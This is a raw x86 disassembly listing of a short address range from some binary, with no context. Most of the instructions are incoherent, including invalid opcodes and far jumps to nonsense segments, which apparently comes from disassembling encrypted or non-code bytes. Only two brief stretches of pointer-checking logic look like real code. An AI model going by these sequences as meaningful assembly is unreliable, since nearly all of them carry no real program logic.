  40aedf:	shr    BYTE PTR [eax-0x1],cl
  40aee2:	arpl   WORD PTR [edx-0x39],bx
  40aee5:	or     edi,DWORD PTR [ebp-0x33fbcc51]
  40aeeb:	sbb    DWORD PTR [ebx],edx
  40aeed:	fdivr  DWORD PTR [edi]
  40aeef:	loopne 0x40af50
  40aef1:	sub    ch,BYTE PTR [edx+0x4d]
  40aef4:	pusha  
  40aef5:	sti    
  40aef6:	push   es
  40aef7:	xor    ah,BYTE PTR [edi-0x1c551ebb]
  40aefd:	pop    esp
  40aefe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aeff:	and    eax,0x39793085
  40af04:	out    0xf7,eax
  40af06:	aad    0xa4
  40af08:	iret   
  40af09:	dec    esp
  40af0a:	neg    DWORD PTR [ecx-0x3d]
  40af0d:	rcl    eax,cl
  40af0f:	cmp    eax,0x6aaadce2
  40af14:	mov    ds:0xd9a2100d,al
  40af19:	leave  
  40af1a:	and    al,0xd5
  40af1c:	into   
  40af1d:	xchg   DWORD PTR [edx+eiz*4],ebx
  40af20:	mov    ebx,0xd9b1f9b8
  40af25:	inc    esp
  40af26:	lock ja 0x40af93
  40af29:	dec    esp
  40af2a:	and    BYTE PTR [edi+0x27bea0f0],0xab
  40af31:	lods   al,BYTE PTR ds:[esi]
  40af32:	adc    DWORD PTR [ebx*8+0x14e8fc78],edi
  40af39:	pop    edi
  40af3a:	add    al,BYTE PTR [ebp-0x2c]
  40af3d:	dec    edx
  40af3e:	inc    edi
  40af3f:	pop    ds
  40af40:	mov    ds:0xf077b2ef,al
  40af45:	bound  ecx,QWORD PTR [ecx+0x56]
  40af48:	jp     0x40af2f
  40af4a:	mov    al,ds:0xa17fc10b
  40af4f:	mov    ch,bh
  40af51:	xchg   esi,eax
  40af52:	lea    ebx,[edx-0x61c1b322]
  40af58:	stos   DWORD PTR es:[edi],eax
  40af59:	mov    al,0x88
  40af5b:	daa    
  40af5c:	fucomip st,st(6)
  40af5e:	fidivr WORD PTR [ecx]
  40af60:	and    eax,0xf431b340
  40af65:	std    
  40af66:	sahf   
  40af67:	push   ss
  40af68:	jne    0x40af58
  40af6a:	mov    BYTE PTR [eax-0x46c5b0df],ah
  40af70:	push   cs
  40af71:	push   0xd6a8f372
  40af76:	and    eax,0xd95eb41d
  40af7b:	out    dx,al
  40af7c:	add    eax,0x50c1623b
  40af81:	add    dl,BYTE PTR [edx+ebx*4]
  40af84:	fnstenv [ebx]
  40af86:	ss push ebp
  40af88:	clc    
  40af89:	mov    esi,0x826dd48a
  40af8e:	mov    edi,0xd3dd2402
  40af93:	aad    0x9d
  40af95:	sbb    BYTE PTR [ebx+ecx*2-0x72245b53],dh
  40af9c:	(bad)
  40afa0:	call   0x22803d37
  40afa5:	les    esi,FWORD PTR [ecx]
  40afa7:	(bad)  
  40afa8:	mov    eax,0x39fa7e07
  40afad:	and    al,0x9a
  40afaf:	ds or  eax,0x6c2b7b72
  40afb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afb6:	push   ebp
  40afb7:	push   ecx
  40afb8:	rol    BYTE PTR [edx+0x1d2a1c75],0x42
  40afbf:	mov    ds:0xa87966b8,al
  40afc4:	xchg   BYTE PTR [edx],bh
  40afc6:	inc    esi
  40afc7:	inc    esp
  40afc8:	pop    ebx
  40afc9:	sub    al,0xef
  40afcb:	adc    BYTE PTR [ecx],cl
  40afcd:	test   al,0x89
  40afcf:	pop    ebp
  40afd0:	hlt    
  40afd1:	mov    eax,DWORD PTR [eax]
  40afd3:	mov    cx,WORD PTR [ebp-0x4]
  40afd7:	movzx  ecx,cx
  40afda:	add    ecx,DWORD PTR [eax]
  40afdc:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40afe3:	mov    DWORD PTR [ebp-0x1c],ecx
  40afe6:	jmp    0x40b333
  40afeb:	js     0x40b055
  40afed:	adc    ebp,ebx
  40afef:	jae    0x40b062
  40aff1:	loopne 0x40b05c
  40aff3:	lfs    esi,FWORD PTR [edx]
  40aff6:	or     dh,dh
  40aff8:	pop    ebx
  40aff9:	xchg   esp,eax
  40affa:	retf   0xe879
  40affd:	jle    0x40b07d
  40afff:	cs jge 0x40b080
  40b002:	jle    0x40afae
  40b004:	loope  0x40b020
  40b006:	daa    
  40b007:	mov    esp,0xfec512ac
  40b00c:	(bad)  
  40b00e:	sbb    al,0xa8
  40b010:	push   esi
  40b011:	std    
  40b012:	jno    0x40af97
  40b014:	cdq    
  40b015:	call   0x479b0e1a
  40b01a:	cld    
  40b01b:	push   eax
  40b01c:	xchg   BYTE PTR ds:0x2f95117d,al
  40b022:	lea    edi,[edi+ecx*4+0x69351f4c]
  40b029:	shl    DWORD PTR [ebp-0x20e4693d],cl
  40b02f:	sub    BYTE PTR [ecx],dl
  40b031:	mov    esp,0xef40a143
  40b036:	jle    0x40b018
  40b038:	or     BYTE PTR ss:[ebp+0x2a630462],bl
  40b03f:	and    eax,0x59596947
  40b044:	int3   
  40b045:	mov    ah,0xd
  40b047:	push   edx
  40b048:	rcr    DWORD PTR [esi-0xb],0x68
  40b04c:	stos   BYTE PTR es:[edi],al
  40b04d:	jmp    0x7adfdd2a
  40b052:	sbb    ebx,DWORD PTR [eax]
  40b054:	sbb    BYTE PTR [edx-0x3bc26487],al
  40b05a:	dec    edx
  40b05b:	gs xchg esi,eax
  40b05d:	push   esp
  40b05e:	mov    bh,0x2b
  40b060:	push   ds
  40b061:	inc    edx
  40b062:	sbb    ebp,DWORD PTR [edi+0x22]
  40b065:	jl     0x40b042
  40b067:	xlat   BYTE PTR ds:[ebx]
  40b068:	nop
  40b069:	int3   
  40b06a:	and    BYTE PTR [ebx+0x5b2852d9],0xd4
  40b071:	ror    BYTE PTR [edx-0x7cb78c30],cl
  40b077:	cmp    ebp,DWORD PTR [edi-0x60782397]
  40b07d:	(bad)  
  40b07e:	test   al,0x8e
  40b080:	dec    esi
  40b081:	aas    
  40b082:	stos   DWORD PTR es:[edi],eax
  40b083:	aaa    
  40b084:	sub    ch,BYTE PTR ds:[eax+0x4]
  40b088:	outs   dx,DWORD PTR ds:[esi]
  40b089:	sbb    al,0x76
  40b08b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b08c:	add    BYTE PTR [edi-0x45879d73],0xaa
  40b093:	jns    0x40b07b
  40b095:	mov    edi,0x2bbb42fd
  40b09a:	aad    0x1d
  40b09c:	xlat   BYTE PTR ds:[ebx]
  40b09d:	popa   
  40b09e:	pop    ds
  40b09f:	in     eax,0x74
  40b0a1:	jns    0x40b08b
  40b0a3:	mov    al,0x71
  40b0a5:	imul   ebp,ebx,0x45f56c97
  40b0ab:	and    DWORD PTR [edi],esi
  40b0ad:	cmp    DWORD PTR [edx],edx
  40b0af:	test   BYTE PTR [esi+0x1ad84346],bl
  40b0b5:	mov    al,dh
  40b0b7:	or     DWORD PTR [eax+0x6fe1ac7f],esp
  40b0bd:	sub    ebx,DWORD PTR [ecx+edi*4+0xf2563c6]
  40b0c4:	pop    ebx
  40b0c5:	lock xchg edx,eax
  40b0c7:	sub    eax,0xbb847e82
  40b0cc:	xor    DWORD PTR [esi],eax
  40b0ce:	clc    
  40b0cf:	hlt    
  40b0d0:	js     0x40b0b8
  40b0d2:	or     al,BYTE PTR [edx]
  40b0d4:	or     DWORD PTR [esi-0x23],edx
  40b0d7:	pushf  
  40b0d8:	adc    eax,0xa4da4fcd
  40b0dd:	in     eax,0x7c
  40b0df:	repz inc edx
  40b0e1:	sub    eax,0x31bb018b
  40b0e6:	jg     0x40b0c2
  40b0e8:	adc    dl,BYTE PTR [ebx]
  40b0ea:	lea    ebx,[ecx]
  40b0ec:	mov    fs,WORD PTR [ebx-0x13]
  40b0ef:	inc    ebp
  40b0f0:	xor    cl,dh
  40b0f2:	ds mov esi,0xd269a9b0
  40b0f8:	xchg   BYTE PTR ds:0xe22b027e,ah
  40b0fe:	aam    0xa6
  40b100:	inc    esi
  40b101:	add    bl,BYTE PTR [ebx+0x6ac4b0e7]
  40b107:	std    
  40b108:	xor    esp,edi
  40b10a:	mov    cl,0x2e
  40b10c:	ds scas al,BYTE PTR es:[edi]
  40b10e:	sbb    DWORD PTR [ebp+edx*8+0x72],eax
  40b112:	iret   
  40b113:	mov    es,ebp
  40b115:	xchg   ecx,eax
  40b116:	sub    cl,ch
  40b118:	adc    DWORD PTR [ebx+0xe154092],0xfa1a58f4
  40b122:	not    dh
  40b124:	add    esi,0x35
  40b127:	(bad)
  40b12a:	jecxz  0x40b0b3
  40b12c:	das    
  40b12d:	jns    0x40b153
  40b12f:	jb     0x40b0fd
  40b131:	(bad)  
  40b132:	repnz leave 
  40b134:	cmp    al,0x46
  40b136:	xchg   edi,eax
  40b137:	adc    BYTE PTR [ebp+0x273934fa],bl
  40b13d:	and    eax,0x31c2ca70
  40b142:	inc    eax
  40b143:	jno    0x40b0fe
  40b145:	pop    eax
  40b146:	xor    edi,DWORD PTR [eax+0x15fcd45a]
  40b14c:	jmp    0x40b106
  40b14e:	add    bh,cl
  40b150:	inc    ebp
  40b151:	mov    eax,0xb8d132cd
  40b156:	jmp    0x4fa8826d
  40b15b:	or     eax,0xd88b35d2
  40b160:	ret    
  40b161:	(bad)  
  40b162:	cmp    BYTE PTR [eax+0x2c5bdcfd],bh
  40b168:	pop    ds
  40b169:	lods   eax,DWORD PTR ds:[esi]
  40b16a:	int3   
  40b16b:	lock mov eax,0xb9739ad2
  40b171:	stos   DWORD PTR es:[edi],eax
  40b172:	cmp    DWORD PTR [edi+esi*1-0x5369c969],eax
  40b179:	adc    DWORD PTR [eax+0x4a16901e],0x19
  40b180:	es adc eax,0xc1a9b8d9
  40b186:	ja     0x40b19f
  40b188:	pop    edx
  40b189:	leave  
  40b18a:	js     0x40b1e0
  40b18c:	leave  
  40b18d:	push   ebx
  40b18e:	mov    dl,0xc4
  40b190:	mov    edi,0x71c7671b
  40b195:	stc    
  40b196:	jbe    0x40b193
  40b198:	sbb    DWORD PTR [esp+ebx*1],0xd5741eab
  40b19f:	gs out dx,eax
  40b1a1:	xchg   esi,eax
  40b1a2:	mov    cl,0x8d
  40b1a4:	lea    eax,[esi+esi*4]
  40b1a7:	jmp    0x45d7:0x1b44cb91
  40b1ae:	sbb    DWORD PTR [eax-0x59dbe969],ebx
  40b1b4:	stos   BYTE PTR es:[edi],al
  40b1b5:	sar    BYTE PTR [esp+eiz*8+0x51],0xef
  40b1ba:	dec    ecx
  40b1bb:	arpl   WORD PTR [eax+0x5671035d],bp
  40b1c1:	fwait
  40b1c2:	clc    
  40b1c3:	pop    es
  40b1c4:	sbb    eax,0xa618cc7d
  40b1c9:	mov    edi,0x62221984
  40b1ce:	inc    DWORD PTR [edx+0x20]
  40b1d1:	push   ss
  40b1d2:	jle    0x40b1fe
  40b1d4:	cmp    bh,cl
  40b1d6:	ret    
  40b1d7:	inc    ebx
  40b1d8:	mov    ebp,0xae913c2a
  40b1dd:	inc    edi
  40b1de:	xchg   esi,eax
  40b1df:	dec    edx
  40b1e0:	push   edi
  40b1e1:	xchg   ebx,eax
  40b1e2:	ins    BYTE PTR es:[edi],dx
  40b1e3:	out    dx,eax
  40b1e4:	push   edx
  40b1e5:	jg     0x40b194
  40b1e7:	mov    cl,0x9c
  40b1e9:	jmp    0x4691:0xcbc5a950
  40b1f0:	inc    edi
  40b1f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1f2:	pop    ecx
  40b1f3:	cwde   
  40b1f4:	add    BYTE PTR [edi],bl
  40b1f6:	jno    0x40b1c3
  40b1f8:	or     BYTE PTR [eax+0x1a],bl
  40b1fb:	sbb    DWORD PTR [edx+eiz*1+0x103de6b7],0x30
  40b203:	cmc    
  40b204:	shl    DWORD PTR [edx+edi*1],1
  40b207:	adc    ecx,ebp
  40b209:	stos   BYTE PTR es:[edi],al
  40b20a:	gs (bad) 
  40b20d:	mov    ecx,0x36c0b5ec
  40b212:	xor    BYTE PTR ds:0xc9b746a,cl
  40b218:	jb     0x40b27d
  40b21a:	fimul  DWORD PTR [esi+esi*8]
  40b21d:	(bad)  
  40b21e:	push   esi
  40b21f:	iret   
  40b220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b221:	push   ebp
  40b222:	inc    esp
  40b223:	loopne 0x40b283
  40b225:	mov    DWORD PTR [edx-0x96572df],esp
  40b22b:	hlt    
  40b22c:	jmp    0xd615bd2d
  40b231:	pop    ebp
  40b232:	mov    bh,0x0
  40b234:	xor    eax,0x61ef96d8
  40b239:	jno    0x40b1fa
  40b23b:	out    dx,al
  40b23c:	fbld   TBYTE PTR [ebx]
  40b23e:	test   BYTE PTR ss:[edi+edx*1+0x3f24bffd],ah
  40b246:	fmul   DWORD PTR [ebx+ebx*8+0x6dc467]
  40b24d:	into   
  40b24e:	aas    
  40b24f:	xchg   ecx,eax
  40b250:	or     al,0x44
  40b252:	jbe    0x40b27c
  40b254:	push   edx
  40b255:	jmp    0x40b259
  40b257:	int3   
  40b258:	(bad)  
  40b259:	dec    edx
  40b25a:	lock jo 0x40b2c8
  40b25d:	loopne 0x40b2dd
  40b25f:	xchg   edx,eax
  40b260:	std    
  40b261:	out    dx,eax
  40b262:	out    dx,eax
  40b263:	lods   al,BYTE PTR ds:[esi]
  40b264:	sub    eax,0x6f12e362
  40b269:	lods   al,BYTE PTR ds:[esi]
  40b26a:	mov    eax,0xdd0339f4
  40b26f:	xchg   ecx,eax
  40b270:	sbb    al,0x5b
  40b272:	icebp  
  40b273:	mov    bl,0xd4
  40b275:	push   ebx
  40b276:	push   esp
  40b277:	test   eax,0x3e124fb7
  40b27c:	xchg   BYTE PTR [ecx],al
  40b27e:	and    bl,BYTE PTR [ebx-0x1b]
  40b281:	or     ebp,ebx
  40b283:	or     ah,BYTE PTR [ebp-0x3f]
  40b286:	scas   eax,DWORD PTR es:[edi]
  40b287:	add    al,0xd1
  40b289:	push   ds
  40b28a:	popf   
  40b28b:	mov    ebx,0x85553d38
  40b290:	lods   al,BYTE PTR ds:[esi]
  40b291:	into   
  40b292:	ins    DWORD PTR es:[edi],dx
  40b293:	enter  0x50ec,0xb8
  40b297:	neg    DWORD PTR [edx-0x896e91]
  40b29d:	mov    ebx,0xfebc5ecc
  40b2a2:	cmp    esp,ebx
  40b2a4:	xchg   esp,eax
  40b2a5:	mov    ch,0x3b
  40b2a7:	mov    bh,0xa6
  40b2a9:	xchg   esp,eax
  40b2aa:	xchg   esi,eax
  40b2ab:	push   cs
  40b2ac:	mov    cl,0x5d
  40b2ae:	call   0x7fed:0xcecb6a85
  40b2b5:	push   ebx
  40b2b6:	imul   edx,DWORD PTR [ebp-0x4c],0x82bde392
  40b2bd:	inc    edx
  40b2be:	pop    esi
  40b2bf:	jmp    0xd4d78197
  40b2c4:	and    al,0x7f
  40b2c6:	div    DWORD PTR [edx-0x674b7d9a]
  40b2cc:	pop    esi
  40b2cd:	pop    DWORD PTR ds:0xdce2283b
  40b2d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2d4:	mov    ss,WORD PTR [ecx+0x13b0cc6b]
  40b2da:	and    edi,DWORD PTR [esi+0x0]
  40b2dd:	mov    edx,0x68c849d6
  40b2e2:	pop    edi
  40b2e3:	add    BYTE PTR [eax+0x31],bh
  40b2e6:	cmp    DWORD PTR [eax+0x19],ebx
  40b2e9:	dec    eax
  40b2ea:	shl    DWORD PTR [eax-0x5176b5c5],0x8a
  40b2f1:	mov    es,WORD PTR [ebx]
  40b2f3:	cmp    al,0x48
  40b2f5:	fidivr DWORD PTR [esi]
  40b2f7:	lods   eax,DWORD PTR ds:[esi]
  40b2f8:	sub    al,0x64
  40b2fa:	jmp    0x6474752c
  40b2ff:	jmp    0xe188:0x97208bc7
  40b306:	jmp    0x114baa9e
  40b30b:	and    DWORD PTR [ecx+0x12],esp
  40b30e:	iret   
  40b30f:	rcl    dh,cl
  40b311:	xor    eax,0x6379ca96
  40b316:	jmp    0x40b351
  40b318:	sub    al,0xc
  40b31a:	shr    BYTE PTR [ebx+0x113a2349],cl
  40b320:	inc    esp
  40b321:	mov    ah,0xd4
  40b323:	fadd   QWORD PTR [esi+ebx*1+0x79]
  40b327:	cmp    esp,esi
  40b329:	pop    esp
  40b32a:	stc    
  40b32b:	cmp    al,0x83
  40b32d:	mov    esp,0x4ab26815
  40b332:	mov    eax,DWORD PTR es:[ebp+0x8]
  40b336:	mov    ecx,DWORD PTR [ebp-0x8]
  40b339:	xor    eax,esi
  40b33b:	add    eax,edi
  40b33d:	cmp    DWORD PTR [ecx],eax
  40b33f:	jne    0x40c44a
  40b345:	mov    eax,DWORD PTR [ebp+0x8]
  40b348:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b34b:	xor    eax,esi
  40b34d:	add    eax,edi
  40b34f:	cmp    DWORD PTR [ecx],eax
  40b351:	jne    0x40b6c1
  40b357:	mov    eax,DWORD PTR [ebp+0x8]
  40b35a:	mov    ecx,DWORD PTR [ebp-0x10]
  40b35d:	xor    eax,esi
  40b35f:	add    eax,edi
  40b361:	mov    DWORD PTR [ecx],eax
  40b363:	jmp    0x40b6b0
  40b368:	cmp    eax,0xe9fdcd2a
  40b36d:	pop    ecx
  40b36e:	dec    ebp
  40b36f:	push   0x46
  40b371:	aam    0xcc
  40b373:	int3   
  40b374:	test   eax,0x29daf336
  40b379:	idiv   DWORD PTR [esi+0x7e]
  40b37c:	cs jge 0x40b3fd
  40b37f:	jle    0x40b309
  40b381:	push   esi
  40b382:	iret   
  40b383:	fcom   QWORD PTR [eax-0x4e520047]
  40b389:	ret    0xe9ca
  40b38c:	jle    0x40b3d8
  40b38e:	push   esp
  40b38f:	and    eax,0x6276fec
  40b394:	ret    
  40b395:	pop    ebx
  40b396:	test   BYTE PTR [esi+0x4f6d1169],ch
  40b39c:	neg    BYTE PTR [eax-0x24]
  40b39f:	iret   
  40b3a0:	adc    eax,0x6f47b94f
  40b3a5:	xchg   ebp,eax
  40b3a6:	push   edi
  40b3a7:	xchg   edi,eax
  40b3a8:	or     dl,ch
  40b3aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3ab:	cld    
  40b3ac:	test   al,0xaa
  40b3ae:	and    DWORD PTR [edi+0x68ac9e1e],ecx
  40b3b4:	inc    ebx
  40b3b5:	cmp    ebx,DWORD PTR [ebx]
  40b3b7:	push   esi
  40b3b8:	and    eax,0x8702209c
  40b3be:	scas   al,BYTE PTR es:[edi]
  40b3bf:	(bad)  
  40b3c1:	push   eax
  40b3c2:	inc    eax
  40b3c3:	cmp    BYTE PTR [ebx-0x52503a67],dl
  40b3c9:	xor    bh,BYTE PTR [edx-0x54]
  40b3cc:	xchg   DWORD PTR [ebx-0x4a],ebp
  40b3cf:	pop    edx
  40b3d0:	inc    edi
  40b3d1:	call   DWORD PTR [esi]
  40b3d3:	mov    eax,ds:0x4516e6c9
  40b3d8:	data16 scas al,BYTE PTR es:[edi]
  40b3da:	clc    
  40b3db:	fs fucomip st,st(3)
  40b3de:	aam    0xd6
  40b3e0:	nop
  40b3e1:	push   edi
  40b3e2:	pop    ds
  40b3e3:	add    eax,0xcb8bf55f
  40b3e8:	ret    
  40b3e9:	aas    
  40b3ea:	jecxz  0x40b3f1
  40b3ec:	xor    eax,0xc1554a35
  40b3f1:	bound  edi,QWORD PTR [edi]
  40b3f3:	mov    al,0xb5
  40b3f5:	inc    ebp
  40b3f6:	jl     0x40b401
  40b3f8:	xor    ebx,esp
  40b3fa:	(bad)  
  40b3fb:	sbb    eax,DWORD PTR [ebx]
  40b3fd:	or     DWORD PTR [edi+edx*2+0x2a],edi
  40b401:	inc    esp
  40b402:	mov    ebx,0xcb4bf723
  40b407:	es push ds
  40b409:	ds retf 
  40b40b:	das    
  40b40c:	shl    BYTE PTR [ebx-0x8d57e90],1
  40b412:	pop    esp
  40b413:	and    ecx,DWORD PTR [ecx-0x3d]
  40b416:	jbe    0x40b453
  40b418:	sub    al,0x67
  40b41a:	out    0x16,al
  40b41c:	icebp  
  40b41d:	sbb    eax,0x76b166bf
  40b422:	scas   eax,DWORD PTR es:[edi]
  40b423:	popf   
  40b424:	loopne 0x40b3f1
  40b426:	(bad)  
  40b427:	add    DWORD PTR [ebx],ebp
  40b429:	pop    edx
  40b42a:	dec    esp
  40b42c:	int    0x73
  40b42e:	cmp    ebx,DWORD PTR [ebx+0x25443af4]
  40b434:	and    BYTE PTR [eax-0x1ac56505],dh
  40b43a:	jge    0x40b465
  40b43c:	in     al,0x2e
  40b43e:	lods   eax,DWORD PTR ds:[esi]
  40b43f:	arpl   WORD PTR [edi+ebx*4+0x1],si
  40b443:	outs   dx,DWORD PTR ds:[esi]
  40b444:	inc    edi
  40b445:	push   cs
  40b446:	dec    edx
  40b447:	mov    ah,0x93
  40b449:	pop    ecx
  40b44a:	jo     0x40b47b
  40b44c:	fisttp DWORD PTR [ecx]
  40b44e:	add    esp,DWORD PTR [esp+eax*1]
  40b451:	and    ah,0x3c
  40b454:	(bad)  
  40b455:	in     al,dx
  40b456:	stc    
  40b457:	mov    ebp,0x68bbd260
  40b45c:	inc    ecx
  40b45d:	ret    0x8795
  40b460:	push   edi
  40b461:	inc    ecx
  40b462:	iret   
  40b463:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b464:	mov    ebx,0xd5c9325
  40b469:	mov    ebp,0xcd7d9ff1
  40b46e:	dec    ecx
  40b46f:	or     DWORD PTR [ebp-0x1b],esp
  40b472:	pop    esp
  40b473:	cmp    eax,edx
  40b475:	inc    ecx
  40b476:	mov    fs,esp
  40b478:	xchg   ebx,eax
  40b479:	fisubr WORD PTR [ebx-0x2]
  40b47c:	mov    edi,ebx
  40b47e:	dec    ebp
  40b47f:	and    al,0x17
  40b481:	mov    bh,0xcb
  40b483:	loopne 0x40b4f8
  40b485:	mov    eax,ds:0x1271be1c
  40b48a:	fst    QWORD PTR [ebx]
  40b48c:	sub    BYTE PTR [eax],al
  40b48e:	adc    eax,0xc1940471
  40b493:	xor    eax,0x9fce6c86
  40b498:	sub    eax,0xb4c4fe71
  40b49d:	clc    
  40b49e:	test   BYTE PTR [esi-0x6e],bh
  40b4a1:	mov    cl,0x8b
  40b4a3:	adc    BYTE PTR [esi],al
  40b4a5:	lods   al,BYTE PTR ds:[esi]
  40b4a6:	push   edi
  40b4a7:	fbstp  TBYTE PTR [eax+0x1b]
  40b4aa:	add    al,0x5a
  40b4ac:	mov    DWORD PTR [esi],esp
  40b4ae:	scas   al,BYTE PTR es:[edi]
  40b4af:	loope  0x40b4f0
  40b4b1:	adc    DWORD PTR [edi-0x3f],ecx
  40b4b4:	scas   al,BYTE PTR es:[edi]
  40b4b5:	cmp    al,0xa0
  40b4b7:	adc    BYTE PTR [ebp-0x31fc3033],ah
  40b4bd:	or     esi,DWORD PTR [edi+0x35]
  40b4c0:	stos   BYTE PTR es:[edi],al
  40b4c1:	fbld   TBYTE PTR [eax]
  40b4c3:	jmp    0xa658958b
  40b4c8:	scas   eax,DWORD PTR es:[edi]
  40b4c9:	imul   ebp,DWORD PTR [ebx+0x7bbcccc7],0xffffffda
  40b4d0:	pop    ebp
  40b4d1:	mov    ch,cl
  40b4d3:	test   eax,0x97f59476
  40b4d8:	ja     0x40b542
  40b4da:	stc    
  40b4db:	or     al,0x6c
  40b4dd:	jle    0x40b501
  40b4df:	(bad)  
  40b4e1:	div    DWORD PTR [edx-0x4510324e]
  40b4e7:	addr16 popfw 
  40b4ea:	mov    DWORD PTR ds:0x4914cb5b,edi
  40b4f0:	cmp    ebp,ebp
  40b4f2:	push   edi
  40b4f3:	push   edi
  40b4f4:	fdivp  st(1),st
  40b4f6:	sub    al,0x56
  40b4f8:	mov    ds:0x1c6ac60e,eax
  40b4fd:	aad    0xd
  40b4ff:	daa    
  40b500:	fmul   DWORD PTR [eax]
  40b502:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b503:	add    eax,0x4fecaec9
  40b508:	add    al,BYTE PTR [edx+0xcdfdae6]
  40b50e:	push   eax
  40b50f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b510:	int    0xdc
  40b512:	jmp    DWORD PTR [esi+0x67dfe73a]
  40b518:	xor    edi,DWORD PTR ds:0x75a33b1
  40b51e:	sbb    esp,DWORD PTR [esi+0x1]
  40b521:	fdiv   st,st(5)
  40b523:	xchg   BYTE PTR [esi],al
  40b525:	add    al,0xae
  40b527:	stos   BYTE PTR es:[edi],al
  40b528:	cmp    BYTE PTR [ebx],0x7c
  40b52b:	dec    edx
  40b52c:	add    ah,BYTE PTR [edx]
  40b52e:	adc    al,0xea
  40b530:	pop    esi
  40b531:	ffreep st(6)
  40b533:	xor    edx,edx
  40b535:	daa    
  40b536:	or     DWORD PTR [ebx+0x1],edx
  40b539:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b53a:	xor    esp,ebx
  40b53c:	fs jno 0x40b500
  40b53f:	and    edx,esp
  40b541:	and    al,0x4a
  40b543:	cmp    bl,BYTE PTR [ebp+0x7332b746]
  40b549:	fiadd  WORD PTR [ecx]
  40b54b:	imul   eax,DWORD PTR [edi],0x13
  40b54e:	push   es
  40b54f:	dec    ebp
  40b550:	adc    ecx,esp
  40b552:	mov    dh,0x8a
  40b554:	or     eax,ecx
  40b556:	cmp    ebx,DWORD PTR [esi+0x27825054]
  40b55c:	test   esp,eax
  40b55e:	or     eax,0x94ba808e
  40b563:	sub    esi,DWORD PTR [esi]
  40b565:	scas   eax,DWORD PTR es:[edi]
  40b566:	(bad)  
  40b567:	(bad)  
  40b569:	xlat   BYTE PTR ds:[ebx]
  40b56a:	ficom  WORD PTR [edi-0x7f]
  40b56d:	pop    ecx
  40b56e:	push   ds
  40b56f:	inc    esi
  40b570:	mov    ds:0xd04923a9,al
  40b575:	jl     0x40b5c4
  40b577:	jmp    0xe2c9:0x6e5ca8c8
  40b57e:	xchg   ebp,eax
  40b57f:	pop    es
  40b580:	jne    0x40b52f
  40b582:	dec    edx
  40b583:	pop    ecx
  40b584:	inc    edx
  40b585:	xchg   esp,eax
  40b586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b587:	inc    edi
  40b588:	(bad)  
  40b589:	popf   
  40b58a:	sbb    DWORD PTR ds:0xc4938f6d,ebp
  40b590:	push   ds
  40b591:	loop   0x40b5b4
  40b593:	sbb    ecx,DWORD PTR [ebp-0x422032da]
  40b599:	dec    esp
  40b59a:	dec    esp
  40b59b:	daa    
  40b59c:	mov    ecx,0x71036555
  40b5a1:	fbld   TBYTE PTR [ebx-0x6f8ac1bc]
  40b5a7:	push   edx
  40b5a8:	imul   ebx,DWORD PTR [ebp-0x62],0xe9939547
  40b5af:	fadd   st(6),st
  40b5b1:	adc    bh,bl
  40b5b3:	xchg   DWORD PTR [edi-0xe],ebx
  40b5b6:	iret   
  40b5b7:	cmp    eax,0xffffffdf
  40b5ba:	cmp    BYTE PTR [esi],dh
  40b5bc:	out    dx,eax
  40b5bd:	jmp    0x40b62a
  40b5bf:	lea    esi,[ecx-0x58]
  40b5c2:	sbb    ebp,esp
  40b5c4:	mov    esi,0x97d199ce
  40b5c9:	or     BYTE PTR [ebp+ecx*8+0x70c139a5],dh
  40b5d0:	(bad)  
  40b5d1:	imul   edx,DWORD PTR ds:0xa7f3890f,0xfaa54170
  40b5db:	pop    ebp
  40b5dc:	cwde   
  40b5dd:	out    dx,al
  40b5de:	stos   BYTE PTR es:[edi],al
  40b5df:	jo     0x40b601
  40b5e1:	aas    
  40b5e2:	dec    edi
  40b5e3:	call   0xda09:0x43b00c11
  40b5ea:	bnd jae 0x40b63d
  40b5ed:	in     al,0x4c
  40b5ef:	ret    
  40b5f0:	outs   dx,DWORD PTR ds:[esi]
  40b5f1:	test   eax,0xee8c63a3
  40b5f6:	xor    DWORD PTR [ecx+0x6ec5e36a],esp
  40b5fc:	nop
  40b5fd:	ds jbe 0x40b629
  40b600:	jno    0x40b666
  40b602:	call   0x285083b3
  40b607:	jno    0x40b685
  40b609:	jle    0x40b674
  40b60b:	jno    0x40b5bc
  40b60d:	sub    cl,BYTE PTR ds:0x4bf46350
  40b613:	(bad)  
  40b614:	cmp    esi,DWORD PTR [edi-0x5bcfe954]
  40b61a:	sbb    ebx,DWORD PTR [ebx+0xb]
  40b61d:	xor    eax,0x130377e3
  40b622:	push   esi
  40b623:	ror    ah,1
  40b625:	push   edx
  40b626:	test   al,0x5f
  40b628:	inc    edx
  40b629:	daa    
  40b62a:	gs mov ecx,0x30327f16
  40b630:	mov    dl,dl
  40b632:	push   ebp
  40b633:	lds    ebx,FWORD PTR [ecx]
  40b635:	mov    esi,0xf97468d4
  40b63a:	in     eax,dx
  40b63b:	(bad)  
  40b63c:	xor    ecx,DWORD PTR [edx]
  40b63e:	mov    cl,0xb6
  40b640:	sbb    DWORD PTR [eax+edi*2-0x3e4a3667],ebp
  40b647:	dec    ebp
  40b648:	dec    eax
  40b649:	pop    ebx
  40b64a:	mov    ds:0x71c100ba,eax
  40b64f:	xchg   ebp,eax
  40b650:	lar    eax,si
  40b653:	hlt    
  40b654:	xlat   BYTE PTR ds:[ebx]
  40b655:	or     BYTE PTR [eax-0x5e],cl
  40b658:	jnp    0x40b67b
  40b65a:	mov    esp,DWORD PTR [ecx-0x5dd74a7d]
  40b660:	in     eax,0xe4
  40b662:	clc    
  40b663:	in     al,0xa5
  40b665:	mov    ah,0x35
  40b667:	jle    0x40b60c
  40b669:	adc    eax,0x7fc3bee9
  40b66e:	xchg   edx,edi
  40b670:	aaa    
  40b671:	fdiv   QWORD PTR [esi]
  40b673:	aaa    
  40b674:	fbstp  TBYTE PTR [esi]
  40b676:	sbb    esi,edi
